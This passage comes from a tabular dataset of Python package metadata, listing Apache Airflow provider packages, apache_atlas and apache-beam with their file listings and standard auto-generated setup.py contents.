# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-papermill package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-papermill setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.papermill', 'airflow.providers.papermill.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-postgres-5.1.0,0,1,1,1,1,0,0,0,get_provider_info.py postgres.py __init__.py postgres.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-postgres package.""""""

from setuptools import find_namespace_packages, setup

version = '5.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-postgres setup.""""""
    setup(
        version=version,
        extras_require={
            'amazon': ['apache-airflow-providers-amazon'],
            'common.sql': ['apache-airflow-providers-common-sql'],
        },
        packages=find_namespace_packages(
            include=['airflow.providers.postgres', 'airflow.providers.postgres.*']
        ),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-redis-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py redis.py __init__.py redis_publish.py __init__.py redis_key.py redis_pub_sub.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-redis package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-redis setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(include=['airflow.providers.redis', 'airflow.providers.redis.*']),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-salesforce-5.1.0,0,1,1,1,1,0,0,0,get_provider_info.py salesforce.py __init__.py bulk.py salesforce_apex_rest.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-salesforce package.""""""

from setuptools import find_namespace_packages, setup

version = '5.1.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-salesforce setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.salesforce', 'airflow.providers.salesforce.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-sendgrid-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py emailer.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-sendgrid package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-sendgrid setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.sendgrid', 'airflow.providers.sendgrid.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-sftp-4.0.0,0,1,1,1,1,0,0,0,get_provider_info.py sftp.py __init__.py sftp.py __init__.py sftp.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-sftp package.""""""

from setuptools import find_namespace_packages, setup

version = '4.0.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-sftp setup.""""""
    setup(
        version=version,
        extras_require={'ssh': ['apache-airflow-providers-ssh']},
        packages=find_namespace_packages(include=['airflow.providers.sftp', 'airflow.providers.sftp.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-slack-5.1.0,0,1,1,1,1,0,0,0,example_slack.py __init__.py get_provider_info.py slack.py slack_webhook.py __init__.py slack.py slack_webhook.py __init__.py sql_to_slack.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-slack package.""""""

from setuptools import find_namespace_packages, setup

version = '5.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-slack setup.""""""
    setup(
        version=version,
        extras_require={
            'common.sql': ['apache-airflow-providers-common-sql'],
            'http': ['apache-airflow-providers-http'],
        },
        packages=find_namespace_packages(include=['airflow.providers.slack', 'airflow.providers.slack.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-snowflake-3.1.0,0,1,1,1,1,0,0,0,get_provider_info.py snowflake.py __init__.py snowflake.py __init__.py s3_to_snowflake.py snowflake_to_slack.py __init__.py common.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-snowflake package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-snowflake setup.""""""
    setup(
        version=version,
        extras_require={
            'common.sql': ['apache-airflow-providers-common-sql'],
            'slack': ['apache-airflow-providers-slack'],
        },
        packages=find_namespace_packages(
            include=['airflow.providers.snowflake', 'airflow.providers.snowflake.*']
        ),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-sqlite-3.1.0,0,1,1,1,1,0,0,0,get_provider_info.py sqlite.py __init__.py sqlite.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-sqlite package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-sqlite setup.""""""
    setup(
        version=version,
        extras_require={'common.sql': ['apache-airflow-providers-common-sql']},
        packages=find_namespace_packages(include=['airflow.providers.sqlite', 'airflow.providers.sqlite.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-ssh-3.1.0,0,1,1,1,1,0,0,0,get_provider_info.py ssh.py __init__.py ssh.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-ssh package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-ssh setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(include=['airflow.providers.ssh', 'airflow.providers.ssh.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-tableau-3.0.1,0,1,1,1,1,0,0,0,get_provider_info.py tableau.py __init__.py tableau.py tableau_refresh_workbook.py __init__.py tableau.py tableau_job_status.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-tableau package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.1'


def do_setup():
    """"""Perform the package apache-airflow-providers-tableau setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.tableau', 'airflow.providers.tableau.*']
        ),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-telegram-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py telegram.py __init__.py telegram.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-telegram package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-telegram setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.telegram', 'airflow.providers.telegram.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache_atlas-0.0.11,0,1,1,1,1,0,1,0,admin.py base_client.py discovery.py entity.py glossary.py lineage.py relationship.py typedef.py __init__.py exceptions.py admin.py discovery.py enums.py glossary.py instance.py lineage.py metrics.py misc.py profile.py relationship.py typedef.py __init__.py utils.py __init__.py LICENSE METADATA RECORD top_level.txt WHEEL,,1
apache-beam-2.40.0,0,1,1,1,1,0,0,0,avro_record.py coders.py coders_test.py coders_test_common.py coder_impl.pxd coder_impl.py fast_coders_test.py observable.py observable_test.py proto2_coder_test_messages_pb2.py row_coder.py row_coder_test.py slow_coders_test.py slow_stream.py standard_coders_test.py stream.pxd stream.pyx stream_test.py typecoders.py typecoders_test.py __init__.py convert.py convert_test.py doctests.py doctests_test.py expressions.py expressions_test.py frames.py frames_test.py frame_base.py frame_base_test.py io.py io_test.py pandas_docs_test.py pandas_doctests_test.py pandas_top_level_functions.py partitionings.py partitionings_test.py schemas.py schemas_test.py transforms.py transforms_test.py __init__.py error.py avro_bitcoin.py autocomplete.py autocomplete_it_test.py autocomplete_test.py distribopt.py distribopt_test.py estimate_pi.py estimate_pi_it_test.py estimate_pi_test.py game_stats.py game_stats_it_test.py game_stats_test.py hourly_team_score.py hourly_team_score_it_test.py hourly_team_score_test.py leader_board.py leader_board_it_test.py leader_board_test.py user_score.py user_score_it_test.py user_score_test.py __init__.py juliaset.py juliaset_test.py juliaset_test_it.py __init__.py juliaset_main.py setup.py __init__.py tfidf.py tfidf_test.py top_wikipedia_sessions.py top_wikipedia_sessions_it_test.py top_wikipedia_sessions_test.py __init__.py bigquery_schema.py bigquery_side_input.py bigquery_side_input_it_test.py bigquery_side_input_test.py bigquery_tornadoes.py bigquery_tornadoes_it_test.py bigquery_tornadoes_test.py bigtableio_it_test.py coders.py coders_it_test.py coders_test.py combiners_test.py custom_ptransform.py custom_ptransform_test.py datastore_wordcount.py datastore_wordcount_it_test.py filters.py filters_test.py group_with_coder.py group_with_coder_test.py mergecontacts.py mergecontacts_test.py multiple_output_pardo.py multiple_output_pardo_test.py __init__.py flight_delays.py flight_delays_it_test.py taxiride.py taxiride_it_test.py taxiride_test.py wordcount.py wordcount_test.py __init__.py fastavro_it_test.py flink_streaming_impulse.py __init__.py pytorch_image_classification.py pytorch_image_segmentation.py pytorch_language_modeling.py sklearn_mnist_classification.py __init__.py kafka_taxi.py __init__.py matrix_power.py matrix_power_test.py snippets.py snippets_test.py cogroupbykey.py cogroupbykey_test.py combineglobally.py combineglobally_test.py combineperkey.py combineperkey_test.py combinevalues.py combinevalues_test.py count.py count_test.py distinct.py distinct_test.py groupbykey.py groupbykey_test.py groupby_test.py groupintobatches.py groupintobatches_test.py latest.py latest_test.py max.py max_test.py mean.py mean_test.py min.py min_test.py sample.py sample_test.py sum.py sum_test.py top.py top_test.py __init__.py filter.py filter_test.py flatmap.py flatmap_test.py keys.py keys_test.py kvswap.py kvswap_test.py map.py map_test.py pardo.py pardo_test.py partition.py partition_test.py regex.py regex_test.py tostring.py tostring_test.py values.py values_test.py withtimestamps.py withtimestamps_test.py __init__.py __init__.py util.py util_test.py __init__.py sql_taxi.py streaming_wordcount.py streaming_wordcount_debugging.py streaming_wordcount_debugging_it_test.py streaming_wordcount_debugging_test.py streaming_wordcount_it_test.py windowed_wordcount.py wordcount.py wordcount_dataframe.py wordcount_debugging.py wordcount_debugging_test.py wordcount_it_test.py wordcount_minimal.py wordcount_minimal_test.py wordcount_test.py wordcount_with_metrics.py wordcount_xlang.py wordcount_xlang_sql.py __init__.py cloudpickle_pickler.py cloudpickle_pickler_test.py dill_pickler.py auth.py json_value.py json_value_test.py __init__.py http_client.py http_client_test.py cells.py cells_test.py metric.py metric_test.py __init__.py module_test.py pickler.py pickler_test.py util.py util_test.py __init__.py avroio.py avroio_test.py boto3_client.py client_test.py fake_client.py messages.py __init__.py __init__.py s3filesystem.py s3filesystem_test.py s3io.py s3io_test.py __init__.py blobstoragefilesystem.py blobstoragefilesystem_test.py blobstorageio.py blobstorageio_test.py __init__.py concat_source.py concat_source_test.py debezium.py pubsub.py __init__.py generate_sequence.py generate_sequence_test.py kafka.py snowflake.py xlang_debeziumio_it_test.py xlang_jdbcio_it_test.py xlang_kafkaio_it_test.py xlang_kinesisio_it_test.py xlang_parquetio_test.py xlang_snowflakeio_it_test.py __init__.py filebasedsink.py filebasedsink_test.py filebasedsource.py filebasedsource_test.py fileio.py fileio_test.py filesystem.py filesystemio.py filesystemio_test.py filesystems.py filesystems_test.py filesystem_test.py flink_streaming_impulse_source.py flink_streaming_impulse_source_test.py __init__.py bigquery.py bigquery_avro_tools.py bigquery_avro_tools_test.py bigquery_file_loads.py bigquery_file_loads_test.py bigquery_io_metadata.py bigquery_io_metadata_test.py bigquery_io_read_it_test.py bigquery_io_read_pipeline.py bigquery_json_it_test.py bigquery_read_internal.py bigquery_read_it_test.py bigquery_read_perf_test.py bigquery_test.py bigquery_tools.py bigquery_tools_test.py bigquery_write_it_test.py bigquery_write_perf_test.py bigtableio.py bigtableio_test.py big_query_query_to_table_it_test.py big_query_query_to_table_pipeline.py adaptive_throttler.py adaptive_throttler_test.py datastoreio.py datastoreio_test.py datastore_write_it_pipeline.py datastore_write_it_test.py helper.py query_splitter.py query_splitter_test.py rampup_throttling_fn.py rampup_throttling_fn_test.py types.py types_test.py util.py util_test.py __init__.py __init__.py dicomclient.py dicomio.py dicomio_integration_test.py dicomio_test.py spannerio.py spannerio_read_it_test.py spannerio_read_perf_test.py spannerio_test.py spannerio_write_it_test.py spannerio_write_perf_test.py __init__.py gce_metadata_util.py gcsfilesystem.py gcsfilesystem_test.py gcsio.py gcsio_integration_test.py gcsio_overrides.py gcsio_test.py bigquery_v2_client.py bigquery_v2_messages.py __init__.py storage_v1_client.py storage_v1_messages.py __init__.py __init__.py __init__.py pubsub.py external.py proto_api.py __init__.py pubsub_integration_test.py pubsub_io_perf_test.py pubsub_it_pipeline.py pubsub_test.py resource_identifiers.py spanner.py bigquery_matcher.py bigquery_matcher_test.py pubsub_matcher.py pubsub_matcher_test.py utils.py utils_test.py xlang_spannerio_it_test.py __init__.py __init__.py hadoopfilesystem.py hadoopfilesystem_test.py iobase.py iobase_test.py jdbc.py kafka.py kinesis.py localfilesystem.py localfilesystem_test.py mongodbio.py mongodbio_it_test.py mongodbio_test.py parquetio.py parquetio_it_test.py parquetio_test.py range_trackers.py range_trackers_test.py restriction_trackers.py restriction_trackers_test.py snowflake.py sources_test.py source_test_utils.py source_test_utils_test.py textio.py textio_test.py tfrecordio.py tfrecordio_test.py utils.py utils_test.py watermark_estimators.py watermark_estimators_test.py __init__.py cells.pxd cells.py cells_test.py execution.pxd execution.py execution_test.py metric.py metricbase.py metric_test.py monitoring_infos.py monitoring_infos_test.py __init__.py cloud_dlp.py cloud_dlp_it_test.py cloud_dlp_test.py naturallanguageml.py naturallanguageml_test.py naturallanguageml_test_it.py recommendations_ai.py recommendations_ai_test.py recommendations_ai_test_it.py videointelligenceml.py videointelligenceml_test.py videointelligenceml_test_it.py visionml.py visionml_test.py visionml_test_it.py __init__.py base.py base_test.py pytorch_inference.py pytorch_inference_it_test.py pytorch_inference_test.py sklearn_inference.py sklearn_inference_it_test.py sklearn_inference_test.py __init__.py __init__.py pipeline_options.py pipeline_options_test.py pipeline_options_validator.py pipeline_options_validator_test.py value_provider.py value_provider_test.py __init__.py pipeline.py pipeline_test.py beam_fn_api_pb2.py beam_fn_api_pb2.pyi beam_fn_api_pb2_grpc.py beam_provision_api_pb2.py beam_provision_api_pb2.pyi beam_provision_api_pb2_grpc.py __init__.py __init__.py beam_interactive_api_pb2.py beam_interactive_api_pb2.pyi beam_interactive_api_pb2_grpc.py __init__.py __init__.py beam_artifact_api_pb2.py beam_artifact_api_pb2.pyi beam_artifact_api_pb2_grpc.py beam_artifact_api_pb2_urns.py beam_expansion_api_pb2.py beam_expansion_api_pb2.pyi beam_expansion_api_pb2_grpc.py beam_job_api_pb2.py beam_job_api_pb2.pyi beam_job_api_pb2_grpc.py __init__.py __init__.py beam_runner_api_pb2.py beam_runner_api_pb2.pyi beam_runner_api_pb2_grpc.py beam_runner_api_pb2_urns.py endpoints_pb2.py endpoints_pb2.pyi endpoints_pb2_grpc.py external_transforms_pb2.py external_transforms_pb2.pyi external_transforms_pb2_grpc.py external_transforms_pb2_urns.py metrics_pb2.py metrics_pb2.pyi metrics_pb2_grpc.py metrics_pb2_urns.py schema_pb2.py schema_pb2.pyi schema_pb2_grpc.py schema_pb2_urns.py standard_window_fns_pb2.py standard_window_fns_pb2.pyi standard_window_fns_pb2_grpc.py standard_window_fns_pb2_urns.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py standard_coders.yaml __init__.py common_urns.py python_urns.py utils.py __init__.py pvalue.py pvalue_test.py common.pxd common.py common_test.py dataflow_exercise_metrics_pipeline.py dataflow_exercise_metrics_pipeline_test.py dataflow_exercise_streaming_metrics_pipeline.py dataflow_exercise_streaming_metrics_pipeline_test.py dataflow_job_service.py dataflow_job_service_test.py dataflow_metrics.py dataflow_metrics_test.py dataflow_runner.py dataflow_runner_test.py apiclient.py apiclient_test.py cloudbuild_v1_client.py cloudbuild_v1_messages.py __init__.py dataflow_v1b3_client.py dataflow_v1b3_messages.py message_matchers.py message_matchers_test.py __init__.py __init__.py names.py __init__.py iobase.py iobase_test.py __init__.py ptransform_overrides.py template_runner_test.py test_dataflow_runner.py __init__.py bundle_factory.py clock.py consumer_tracking_pipeline_visitor.py consumer_tracking_pipeline_visitor_test.py direct_metrics.py direct_metrics_test.py direct_runner.py direct_runner_test.py direct_userstate.py evaluation_context.py executor.py helper_transforms.py sdf_direct_runner.py sdf_direct_runner_test.py test_direct_runner.py test_stream_impl.py transform_evaluator.py util.py watermark_manager.py __init__.py augmented_pipeline.py augmented_pipeline_test.py background_caching_job.py background_caching_job_test.py cache_manager.py cache_manager_test.py cacheable.py expression_cache.py expression_cache_test.py read_cache.py read_cache_test.py reify.py streaming_cache.py streaming_cache_test.py write_cache.py write_cache_test.py __init__.py dataproc_cluster_manager.py dataproc_cluster_manager_test.py types.py __init__.py display_manager.py interactive_pipeline_graph.py pcoll_visualization.py pcoll_visualization_test.py pipeline_graph.py pipeline_graph_renderer.py pipeline_graph_test.py __init__.py interactive_beam.py interactive_beam_test.py interactive_environment.py interactive_environment_test.py interactive_runner.py interactive_runner_test.py interactive_environment_inspector.py interactive_environment_inspector_test.py __init__.py capture_control.py capture_control_test.py capture_limiters.py capture_limiters_test.py interactive_options.py __init__.py pipeline_fragment.py pipeline_fragment_test.py pipeline_instrument.py pipeline_instrument_test.py recording_manager.py recording_manager_test.py beam_sql_magics.py beam_sql_magics_test.py sql_chain.py sql_chain_test.py utils.py utils_test.py __init__.py notebook_executor.py screen_diff.py __init__.py mock_env.py 